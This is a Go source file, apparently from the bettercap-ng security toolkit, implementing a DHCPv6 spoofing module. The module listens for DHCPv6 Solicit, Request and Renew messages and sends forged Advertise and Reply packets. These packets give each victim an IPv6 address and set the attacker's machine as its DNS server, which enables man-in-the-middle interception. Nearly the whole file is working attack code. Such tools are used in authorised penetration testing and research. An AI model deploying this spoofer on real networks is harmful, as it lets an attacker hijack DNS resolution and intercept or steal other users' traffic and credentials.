package modules

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/evilsocket/bettercap-ng/core"
	"github.com/evilsocket/bettercap-ng/log"
	"github.com/evilsocket/bettercap-ng/packets"
	"github.com/evilsocket/bettercap-ng/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	// TODO: refactor to use gopacket when gopacket folks
	// will fix this > https://github.com/google/gopacket/issues/334
	"github.com/mdlayher/dhcp6"
	"github.com/mdlayher/dhcp6/dhcp6opts"
)

type DHCP6Spoofer struct {
	session.SessionModule
	Handle  *pcap.Handle
	DUID    *dhcp6opts.DUIDLLT
	DUIDRaw []byte
	Domain  string
}

func NewDHCP6Spoofer(s *session.Session) *DHCP6Spoofer {
	spoof := &DHCP6Spoofer{
		SessionModule: session.NewSessionModule("dhcp6.spoof", s),
		Handle:        nil,
	}

	spoof.AddParam(session.NewStringParameter("dhcp6.spoof.domain",
		"microsoft.com",
		``,
		"Domain name to spoof."))

	spoof.AddHandler(session.NewModuleHandler("dhcp6.spoof on", "",
		"Start the DHCPv6 spoofer in the background.",
		func(args []string) error {
			return spoof.Start()
		}))

	spoof.AddHandler(session.NewModuleHandler("dhcp6.spoof off", "",
		"Stop the DHCPv6 spoofer in the background.",
		func(args []string) error {
			return spoof.Stop()
		}))

	return spoof
}

func (s DHCP6Spoofer) Name() string {
	return "dhcp6.spoof"
}

func (s DHCP6Spoofer) Description() string {
	return "Replies to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server (https://github.com/fox-it/mitm6/)."
}

func (s DHCP6Spoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (s *DHCP6Spoofer) Configure() error {
	var err error

	if s.Handle, err = pcap.OpenLive(s.Session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
		return err
	}

	err = s.Handle.SetBPFFilter("ip6 and udp")
	if err != nil {
		return err
	}

	if err, s.Domain = s.StringParam("dhcp6.spoof.domain"); err != nil {
		return err
	}

	if s.DUID, err = dhcp6opts.NewDUIDLLT(1, time.Date(2000, time.January, 1, 0, 0, 0, 0, time.UTC), s.Session.Interface.HW); err != nil {
		return err
	} else if s.DUIDRaw, err = s.DUID.MarshalBinary(); err != nil {
		return err
	}

	return nil
}

const DHCP6OptDNSServers = 23
const DHCP6OptDNSDomains = 24
const DHCP6OptClientFQDN = 39

// link-local
const IPv6Prefix = "fe80::"

type DHCPv6Layer struct {
	Raw []byte
}

func (l DHCPv6Layer) SerializeTo(b gopacket.SerializeBuffer, opts gopacket.SerializeOptions) error {
	size := len(l.Raw)

	bytes, err := b.PrependBytes(size)
	if err != nil {
		return err
	}

	copy(bytes, l.Raw)
	return nil
}

func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, target net.HardwareAddr) {
	pktIp6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)

	fqdn := target.String()
	if raw, found := solicit.Options[DHCP6OptClientFQDN]; found == true && len(raw) >= 1 {
		fqdn = string(raw[0])
	}

	log.Info("Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %s.", core.Bold(fqdn), target, core.Bold(s.Domain))

	var solIANA dhcp6opts.IANA

	if raw, found := solicit.Options[dhcp6.OptionIANA]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find IANA.")
		return
	} else if err := solIANA.UnmarshalBinary(raw[0]); err != nil {
		log.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
		return
	}

	adv := dhcp6.Packet{
		MessageType:   dhcp6.MessageTypeAdvertise,
		TransactionID: solicit.TransactionID,
		Options:       make(dhcp6.Options),
	}

	lenDomain := len(s.Domain)
	rawDomain := append([]byte{byte(lenDomain & 0xff)}, []byte(s.Domain)...)
	adv.Options.AddRaw(DHCP6OptDNSDomains, rawDomain)
	adv.Options.AddRaw(DHCP6OptDNSServers, s.Session.Interface.IPv6)
	adv.Options.AddRaw(dhcp6.OptionServerID, s.DUIDRaw)

	var rawCID []byte
	if raw, found := solicit.Options[dhcp6.OptionClientID]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find client id.")
		return
	} else {
		rawCID = raw[0]
	}
	adv.Options.AddRaw(dhcp6.OptionClientID, rawCID)

	var ip net.IP
	if t, found := s.Session.Targets.Targets[target.String()]; found == true {
		ip = t.IP
	} else {
		log.Warning("Address %s not known, using random identity association address.", target.String())
		rand.Read(ip)
	}

	addr := fmt.Sprintf("%s%s", IPv6Prefix, strings.Replace(ip.String(), ".", ":", -1))

	iaaddr, err := dhcp6opts.NewIAAddr(net.ParseIP(addr), 300*time.Second, 300*time.Second, nil)
	if err != nil {
		log.Error("Error creating IAAddr: %s", err)
		return
	}

	iaaddrRaw, err := iaaddr.MarshalBinary()
	if err != nil {
		log.Error("Error serializing IAAddr: %s", err)
		return
	}

	opts := dhcp6.Options{dhcp6.OptionIAAddr: [][]byte{iaaddrRaw}}
	iana := dhcp6opts.NewIANA(solIANA.IAID, 200*time.Second, 250*time.Second, opts)
	ianaRaw, err := iana.MarshalBinary()
	if err != nil {
		log.Error("Error serializing IANA: %s", err)
		return
	}

	adv.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)

	rawAdv, err := adv.MarshalBinary()
	if err != nil {
		log.Error("Error serializing advertisement packet: %s.", err)
		return
	}

	eth := layers.Ethernet{
		SrcMAC:       s.Session.Interface.HW,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ip6 := layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      s.Session.Interface.IPv6,
		DstIP:      pktIp6.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}

	udp.SetNetworkLayerForChecksum(&ip6)

	final := DHCPv6Layer{
		Raw: rawAdv,
	}

	err, raw := packets.Serialize(&eth, &ip6, &udp, &final)
	if err != nil {
		log.Error("Error serializing packet: %s.", err)
		return
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.Session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}
}

func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.Packet, target net.HardwareAddr) {
	log.Debug("Sending spoofed DHCPv6 reply to %s after its %s packet.", core.Bold(target.String()), toType)

	pktIp6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
	reply := dhcp6.Packet{
		MessageType:   dhcp6.MessageTypeReply,
		TransactionID: req.TransactionID,
		Options:       make(dhcp6.Options),
	}

	var reqIANA dhcp6opts.IANA
	if raw, found := req.Options[dhcp6.OptionIANA]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find IANA.")
		return
	} else if err := reqIANA.UnmarshalBinary(raw[0]); err != nil {
		log.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
		return
	}

	var rawCID []byte
	if raw, found := req.Options[dhcp6.OptionClientID]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find client id.")
		return
	} else {
		rawCID = raw[0]
	}

	lenDomain := len(s.Domain)
	rawDomain := append([]byte{byte(lenDomain & 0xff)}, []byte(s.Domain)...)
	reply.Options.AddRaw(DHCP6OptDNSDomains, rawDomain)

	reply.Options.AddRaw(dhcp6.OptionClientID, rawCID)
	reply.Options.AddRaw(dhcp6.OptionServerID, s.DUIDRaw)
	reply.Options.AddRaw(DHCP6OptDNSServers, s.Session.Interface.IPv6)

	opts := dhcp6.Options{} //dhcp6.OptionIAAddr: [][]byte{iaaddrRaw}}
	iana := dhcp6opts.NewIANA(reqIANA.IAID, 200*time.Second, 250*time.Second, opts)
	ianaRaw, err := iana.MarshalBinary()
	if err != nil {
		log.Error("Error serializing IANA: %s", err)
		return
	}
	reply.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)

	rawAdv, err := reply.MarshalBinary()
	if err != nil {
		log.Error("Error serializing advertisement packet: %s.", err)
		return
	}

	eth := layers.Ethernet{
		SrcMAC:       s.Session.Interface.HW,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ip6 := layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      s.Session.Interface.IPv6,
		DstIP:      pktIp6.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}

	udp.SetNetworkLayerForChecksum(&ip6)

	final := DHCPv6Layer{
		Raw: rawAdv,
	}

	err, raw := packets.Serialize(&eth, &ip6, &udp, &final)
	if err != nil {
		log.Error("Error serializing packet: %s.", err)
		return
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.Session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}

	if toType == "request" {
		var addr net.IP
		if raw, found := reqIANA.Options[dhcp6.OptionIAAddr]; found == true {
			addr = net.IP(raw[0])
		}

		log.Info("IPv6 address %s is now assigned to %s", addr.String(), target)
	}
}

func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
	var dhcp dhcp6.Packet
	var err error

	eth := pkt.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	udp := pkt.Layer(layers.LayerTypeUDP).(*layers.UDP)

	// we just got a dhcp6 packet?
	if err = dhcp.UnmarshalBinary(udp.Payload); err == nil {
		switch dhcp.MessageType {
		case dhcp6.MessageTypeSolicit:

			s.dhcpAdvertise(pkt, dhcp, eth.SrcMAC)

		case dhcp6.MessageTypeRequest:
			if raw, found := dhcp.Options[dhcp6.OptionServerID]; found == true && len(raw) >= 1 {
				rawServerID := raw[0]
				if bytes.Compare(rawServerID, s.DUIDRaw) == 0 {
					s.dhcpReply("request", pkt, dhcp, eth.SrcMAC)
				}
			}

		case dhcp6.MessageTypeRenew:
			if raw, found := dhcp.Options[dhcp6.OptionServerID]; found == true && len(raw) >= 1 {
				rawServerID := raw[0]
				if bytes.Compare(rawServerID, s.DUIDRaw) == 0 {
					s.dhcpReply("renew", pkt, dhcp, eth.SrcMAC)
				}
			}
		}

		return
	}

	// DNS request?
	dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
	if parsed == true {
		log.Warning("Got DNS request!")
		log.Info("%s", dns)
	}
}

func (s *DHCP6Spoofer) Start() error {
	if s.Running() == true {
		return session.ErrAlreadyStarted
	} else if err := s.Configure(); err != nil {
		return err
	}

	s.SetRunning(true)

	go func() {
		defer s.Handle.Close()

		src := gopacket.NewPacketSource(s.Handle, s.Handle.LinkType())
		for packet := range src.Packets() {
			if s.Running() == false {
				break
			}

			s.onPacket(packet)
		}
	}()

	return nil
}

func (s *DHCP6Spoofer) Stop() error {
	if s.Running() == false {
		return session.ErrAlreadyStopped
	}
	s.SetRunning(false)
	return nil
}
